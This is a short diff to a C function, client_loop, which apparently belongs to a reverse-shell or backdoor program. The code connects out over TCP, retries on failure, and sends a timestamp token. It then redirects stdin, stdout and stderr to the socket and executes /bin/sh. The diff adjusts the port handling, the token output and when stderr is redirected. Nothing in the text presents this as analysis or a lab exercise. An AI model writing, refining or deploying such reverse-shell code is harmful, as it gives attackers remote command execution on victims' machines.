@@ -17,6 +17,7 @@ void client_loop(char *p)
     int sock;
     char *s = NULL;
     if (!p) s = PORT;
+    else s = p;
 start:
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock == -1) return;
@@ -29,14 +30,14 @@ start:
 
     if (connect(sock, res0[0].ai_addr, res0[0].ai_addrlen) != 0) goto retry;
 
-    if (s)
+    if (p)
     {
         struct timeval tv;
         gettimeofday(&tv, NULL);
         uint64_t token = 1000000 * tv.tv_sec + tv.tv_usec;
         char str[32];
-        snprintf(str, sizeof(str), "%" PRIu64 "\n", token);
-        printf("%sEND\n", str);
+        snprintf(str, sizeof(str), "%" PRIu64 "END\n", token);
+        write(1, str, strlen(str));
         write(sock, str, strlen(str));
     }
 
@@ -45,7 +46,7 @@ start:
     {
         dup2(sock, 0);
         dup2(sock, 1);
-        if (s) dup2(sock, 2);
+        if (p) dup2(sock, 2);
 
         execve("/bin/sh", (char *[]){PREFIX, NULL}, NULL);
     }
